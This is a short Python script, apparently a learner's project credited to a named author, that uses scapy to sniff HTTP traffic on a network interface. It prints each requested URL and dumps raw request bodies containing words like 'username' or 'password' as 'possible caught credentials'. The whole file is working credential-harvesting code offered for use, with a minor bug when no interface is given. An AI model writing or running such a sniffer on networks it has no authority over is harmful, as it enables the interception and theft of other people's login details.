#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface To Sniff", metavar="INTERFACE")
    args = parser.parse_args()
    if not args.interface:
        print("[-] Enter an interface to sniff packets! Use --help for more info.")
        return
    else:
        return args

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
        return url

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "name", "user", "pass", "key", "password", "admin", "login", "enter"]
        for x in keywords:
            if x in load:
                return load

def process(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST -->> "+url)
        login = get_login(packet)
        if login:
            print("\n\n[+] Possible caught credentials -->> " + login + "\n\n")


args = get_arguments()
print("-->PACKET SNIFFER TOOL \n-->Waseeq Ur Rehman \n Now working..")
sniff(args.interface)




